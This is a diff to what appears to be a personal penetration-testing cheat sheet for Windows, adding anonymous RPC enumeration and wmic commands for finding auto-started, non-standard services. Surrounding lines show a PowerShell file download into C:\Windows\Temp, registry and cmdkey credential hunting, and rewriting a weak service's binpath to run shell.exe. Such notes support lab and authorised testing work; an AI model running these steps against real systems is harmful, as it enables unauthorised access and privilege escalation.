@@ -8,6 +8,9 @@
 	cmd /c
 	cmd /k
 
+## RPC discover
+	rpcclient -U "" -N 10.10.10.11s 
+
 
 ## Powershell download a file
 	powershell.exe  (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip") 
@@ -73,6 +76,9 @@
 
 # Windows privesc
 
+# Check events
+	cd events
+	
 ## Stored Credentials
 	1. Search the registry for usernames and passwords.
 	2. If cmdkey /list returns entries, it means that you may able to runas certain user who stored his credentials in windows.
@@ -140,6 +146,15 @@
 	Modify the config using and start the service to execute the payload.
 
 		sc config daclsvc binpath= "C:\Users\user\Desktop\shell.exe"
+	
+	Listing the running service 
+		wmic service get name,displayname,pathname,startmode
+	
+	Listing service that are autostarted
+		wmic service get name,displayname,pathname,startmode|findstr /i "auto"
+	
+	Listing non standart service that are autostarted
+		wmic service get name,displayname,pathname,startmode|findstr /i "auto" | findstr /i /v "c:\windows"
 
 ## Weak Registry Permission
 	In Windows, services have a registry keys and those keys are located at: 
